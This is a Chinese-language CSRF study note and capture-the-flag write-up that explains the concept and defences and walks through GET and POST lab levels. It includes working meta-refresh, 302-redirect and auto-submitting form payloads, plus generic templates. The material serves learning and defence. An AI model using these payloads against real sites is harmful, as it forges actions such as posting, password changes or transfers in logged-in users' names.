---
aliases:
  - cross-site request forgery
  - 跨站请求伪造
---
## 1. 什么是 CSRF

CSRF 的全称是 **Cross-Site Request Forgery**，中文一般叫 **跨站请求伪造**。

它的核心意思是：

**攻击者诱导受害者的浏览器，在受害者已登录某个网站的前提下，向该网站发出一个“看起来像受害者本人操作”的请求。**

也就是说，攻击者自己并没有拿到受害者密码，也不需要直接控制目标网站，只需要：

- 受害者已经登录目标网站
- 受害者又访问了攻击者控制的页面
- 这个攻击页面能诱导浏览器向目标站点发请求

这样，目标网站就可能误以为这是受害者本人发起的操作。

---

## 2. CSRF 和 XSS 的区别

很多新手容易把 XSS 和 CSRF 混在一起。


XSS 是：**把恶意脚本注入到目标网站页面里执行。**

特点是：

- 恶意代码运行在目标网站上下文中
- 可以直接读页面内容、执行 JS、窃取信息等

### CSRF

CSRF 是：**不需要在目标网站里执行恶意代码，只需要让受害者浏览器替你发请求。**

特点是：

- 重点是“伪造请求”
- 主要利用受害者已有登录态
- 往往不能直接读取响应内容
- 常见影响是“代替用户执行操作”

一句话区分：

- **XSS：在目标站里执行你的代码**
- **CSRF：借受害者浏览器替你发请求**

---

## 3. 为什么 CSRF 会发生

因为浏览器的设计目标之一就是“网站之间可以互相跳转、互相引用资源”。

比如浏览器天然支持：

- 点击链接跳转到别的网站
- 页面自动重定向到别的网站
- 表单提交到别的网站
- 加载其他站点的图片、iframe 等

这本来是 Web 的正常功能，但同时也带来了安全风险：

**攻击者网站也能利用这些机制，诱导受害者浏览器向目标网站发请求。**

---

## 4. CSRF 成立的前提条件

一个典型的 CSRF 攻击通常需要满足这几个条件：

### 条件 1：受害者已登录目标站点

例如受害者已经登录了：

```text
http://challenge.localhost/
```

浏览器里已经保存了该站点的 session cookie。

### 条件 2：攻击者能诱导受害者访问恶意页面

例如：

```text
http://hacker.localhost:1337/
```

### 条件 3：目标站点存在“仅依赖 [[Cookie]] 身份认证”的敏感操作

比如：

- 发布帖子
- 转账
- 修改邮箱
- 修改密码
- 发评论
- 点赞/关注
- 发帖

### 条件 4：目标站点没有有效的 CSRF 防护

例如没有：

- CSRF Token
- SameSite 保护
- Origin/Referer 检查
- 二次确认机制

---

## 5. 浏览器为什么会“自动带上登录态”

这是理解 CSRF 的关键。

浏览器中的 cookie 是**按域名保存**的。  
例如你登录了：

```text
http://challenge.localhost/
```

那么浏览器会保存这个站点的 cookie。

以后只要浏览器再次请求 `challenge.localhost`，浏览器就会自动带上该站点对应的 cookie。

### 重点

这不是“网站 A 的 cookie 发给网站 B”，而是：

- 恶意网站诱导浏览器去请求网站 A
    
- 浏览器发现目标是网站 A
    
- 所以自动带上网站 A 自己的 cookie
    

所以 CSRF 不是“串站登录”，而是：

**攻击者借受害者浏览器，冒用受害者在目标站点已有的登录态。**

---

## 6. 同源策略（SOP）和 CSRF 的关系

SOP 是 **Same-Origin Policy**，即 **同源策略**。

它的作用是限制不同源之间的某些敏感交互，比如：

- 一个网站不能随便读另一个网站的 DOM
    
- 不能任意读跨域响应内容
    
- JS 的跨源请求会受到限制
    

### 但 SOP 不能完全阻止 CSRF

因为 SOP 主要限制的是：

**读取跨站内容、脚本层面的交互**

而 CSRF 只需要：

**把请求发出去**

很多浏览器允许“跨站导航”或“跨站表单提交”，因此即使 SOP 存在，CSRF 仍然可能成立。

一句话：

**SOP 更擅长阻止“读”，不一定能阻止“发”。**

---

## 7. GET 型 CSRF

在你做的第一关里，目标接口是：

```text
http://challenge.localhost/publish
```

而且源码里写明：

```python
@app.route("/publish", methods=["GET"])
def challenge_publish():
```

这意味着：只要受害者浏览器访问了这个 URL，就会触发发布操作。

### GET 型 CSRF 的利用思路

因为是 GET 请求，最简单的方法是：

- 自动跳转
    
- meta refresh
    
- 302 重定向
    
- 链接/iframe/img 等某些方式
    

例如恶意页面：

```html
<!doctype html>
<html>
<head>
  <meta http-equiv="refresh" content="0; url=http://challenge.localhost/publish">
</head>
<body></body>
</html>
```

或者让恶意服务器直接返回 302：

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://challenge.localhost/publish")
        self.end_headers()

HTTPServer(("0.0.0.0", 1337), Handler).serve_forever()
```

### 为什么能成功

因为 `/challenge/victim` 会先让 admin 登录 `challenge.localhost`，然后访问你的恶意站点。  
恶意站点再诱导浏览器跳转到 `/publish`，浏览器请求 `challenge.localhost` 时会自动附带 admin 的 session cookie，于是服务端以为是 admin 自己点击了发布。

---

## 8. POST 型 CSRF

第二关的重点是：

**不能只会伪造 GET，也要会伪造 POST。**

一般 POST 请求常见来源有两种：

- JavaScript 发起的请求，例如 `fetch`
    
- HTML 表单提交
    

而题目提示已经说了：

**要用表单提交，不要依赖 JS 跨源请求。**

### 为什么不能直接用 fetch

因为跨源 JS 请求常常会受到 SOP、CORS、cookie 策略限制。  
即使请求发出去了，也不一定会带上目标站点 cookie。

### POST 型 CSRF 的正确做法

构造一个跨站表单，然后在恶意页面加载后自动提交：

```html
<!doctype html>
<html>
<body>
  <form id="csrf" action="http://challenge.localhost/draft" method="POST">
    <input type="hidden" name="content" value="pwned">
    <input type="hidden" name="publish" value="on">
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

这里的 JS 只是在“自动点提交”，真正发出的请求仍然是 **form submission**，这是这关的关键。

---

## 9. 题目源码分析：为什么能看到 flag

你贴出的第一关源码里，核心逻辑是：

### 数据初始化

```python
db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
```

意思是：

- admin 有一条内容为 flag 的帖子
    
- 初始状态 `published = FALSE`
    
- 也就是 flag 一开始是草稿
    

### 发布接口

```python
@app.route("/publish", methods=["GET"])
def challenge_publish():
    if "username" not in flask.session:
        flask.abort(403, "Log in first!")

    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [flask.session.get("username")])
    return flask.redirect("/")
```

这表示：

- 当前登录用户访问 `/publish`
    
- 该用户的所有帖子都会变成 `published = TRUE`
    

如果当前登录用户是 `admin`，那 admin 的 flag 草稿就会被公开。

### 首页显示规则

```python
if username == "admin":
    page += """<b>To prevent XSS, the admin does not view messages!</b>"""
elif username:
    ...
    for post in db.execute("SELECT * FROM posts").fetchall():
        page += f"""<h2>Author: {post["author"]}</h2>"""
        if post["published"]:
            page += post["content"] + "<hr>\n"
        else:
            page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
```

意思是：

- **admin 登录时看不到消息**
    
- **普通已登录用户能看到所有帖子**
    
    - 如果已发布，显示完整内容
        
    - 如果未发布，只显示前 12 个字符
        
- 未登录用户只能看登录页
    

所以实验成功流程是：

1. admin 已登录
    
2. 你用 CSRF 让 admin 访问 `/publish`
    
3. admin 的 flag 草稿变成公开
    
4. 你再用 `guest` 或 `hacker` 登录首页
    
5. 就能看到完整的 flag
    

---

## 10. 为什么你用 curl 看不到 flag

你当时执行：

```bash
curl -s http://challenge.localhost/
```

结果只看到登录页，这很正常。

因为：

- `/challenge/victim` 用的是浏览器中的 admin 会话
    
- 你单独执行的 `curl` 并没有 admin 的 cookie
    
- 所以服务端只会把你当作未登录用户
    

### 正确查看方式

用普通账号登录后再访问：

```bash
curl -s -c cookies.txt -d 'username=guest&password=password' http://challenge.localhost/login -o /dev/null && \
curl -s -b cookies.txt http://challenge.localhost/
```

然后你就看到了：

```html
<h2>Author: admin</h2>pwn.college{...}<hr>
```

这说明攻击成功，admin 的帖子已经发布。

---

## 11. 新手最容易误解的点

### 误解 1：是不是登录了攻击者网站，就把目标网站账号“导过去了”

不是。

正确理解是：

- 受害者登录的是目标网站
    
- 攻击者页面只是诱导浏览器向目标网站发请求
    
- 浏览器请求目标网站时会自动附带目标网站自己的 cookie
    

不是“账号导入”，也不是“cookie 串到别的网站”，而是：

**借用浏览器已有的登录态。**

### 误解 2：CSRF 需要读取响应

不一定。

很多 CSRF 场景只要求：

- 请求成功发出去
    
- 服务端执行了敏感操作
    

攻击者往往并不需要看到响应内容。

### 误解 3：SOP 可以完全阻止 CSRF

不能。

SOP 更偏向阻止跨站读取，而不是完全阻止跨站提交或跳转。

---

## 12. GET 型和 POST 型 CSRF 对比

### GET 型 CSRF

特点：

- 利用简单
    
- 常通过跳转、图片、iframe、meta refresh 等实现
    
- 只要访问 URL 就会触发操作
    

典型例子：

```text
http://challenge.localhost/publish
```

### POST 型 CSRF

特点：

- 不能只靠跳转
    
- 一般通过 HTML form 提交
    
- 可配合 JS 自动提交表单
    

典型模板：

```html
<form id="f" action="http://target/path" method="POST">
  <input type="hidden" name="param1" value="value1">
</form>
<script>
  document.getElementById('f').submit();
</script>
```

---

## 13. CSRF 常见攻击场景

现实中，CSRF 可能被用于：

- 修改用户资料
    
- 改邮箱
    
- 改密码
    
- 发布内容
    
- 删除内容
    
- 点赞/取消关注
    
- 下单
    
- 转账
    
- 添加管理员账号
    

前提都是：

**目标站点只依赖 cookie 判断用户身份，而没有额外确认这个请求是不是用户本人主动发起的。**

---

## 14. 常见防御手段

### 1）CSRF Token

服务端给表单附带一个随机 token，提交时必须带回。  
攻击者无法提前知道 token，因此无法伪造有效请求。

这是最经典、最常用的防御方式。

### 2）SameSite Cookie

给 cookie 设置 `SameSite` 属性，可以限制跨站请求时是否发送 cookie。

例如：

- `SameSite=Lax`
    
- `SameSite=Strict`
    

这能显著减少 CSRF 风险。

### 3）检查 Origin / Referer

服务端检查请求来源是否来自自己站点。  
如果不是，拒绝请求。

### 4）敏感操作要求二次确认

例如：

- 输入密码确认
    
- 短信验证
    
- 邮件确认
    
- CAPTCHA
    

### 5）不要用 GET 做敏感操作

像“发布、删除、转账”这种会改变状态的操作，不应该设计成 GET。  
GET 本来就更容易被跨站诱导触发。

---

## 15. 你这两关学到的关键结论

### 第一关：GET-CSRF

你学会了：

- 不用 XSS 也能伪造请求
    
- GET 请求可以通过跳转/重定向触发
    
- 浏览器访问目标域时会自动带上该域 cookie
    
- 不能用未登录 curl 代替浏览器会话理解结果
    

### 第二关：POST-CSRF

你学会了：

- POST 不能只靠跳转
    
- 需要用 HTML form 提交
    
- JS 可以自动提交表单，但请求本质仍然是表单请求
    
- 构造隐藏字段时要根据服务端源码找参数名
    

---

## 16. 新手做题时的通用思路

以后碰到 CSRF 题，可以按这个顺序分析：

### 第一步：找敏感接口

看源码或抓包，确认：

- 路由是什么
    
- 是 GET 还是 POST
    
- 需要哪些参数
    

### 第二步：判断利用方式

- 如果是 GET：优先考虑跳转、302、meta refresh
    
- 如果是 POST：优先考虑 HTML form + 自动提交
    

### 第三步：确认受害者身份

看 victim 流程是否会：

- 自动登录
    
- 再访问你的恶意页面
    

### 第四步：确认结果如何查看

不是所有题都能未登录直接看到结果，要结合源码判断：

- 是否需要普通用户登录查看
    
- 是否需要另一个接口查看结果
    
- 是否只显示部分内容
    

### 第五步：不要误把“看不到结果”当成“攻击失败”

很多时候：

- 攻击已经成功
    
- 只是你当前查看方式不对
    

---

## 17. 一份最简记忆版

你可以把 CSRF 先记成这句话：

**CSRF 就是攻击者借受害者已经登录的网站身份，让受害者浏览器替自己向目标网站发起请求。**

再记两个模板。

### GET-CSRF 模板

```html
<meta http-equiv="refresh" content="0; url=http://target/action">
```

### POST-CSRF 模板

```html
<form id="f" action="http://target/action" method="POST">
  <input type="hidden" name="a" value="1">
</form>
<script>
  document.getElementById('f').submit();
</script>
```

---

## 18. 你的实验结论

你已经实际完成了一个完整的 CSRF 利用链：

- 目标站点中 admin 的 flag 初始是草稿
    
- 你用恶意页面让已登录 admin 触发发布
    
- 浏览器带着 admin session 完成请求
    
- flag 被公开
    
- 你再用普通账号登录读取公开内容
    
- 最终拿到 flag
    

这就是一个非常标准的 CSRF 教学案例。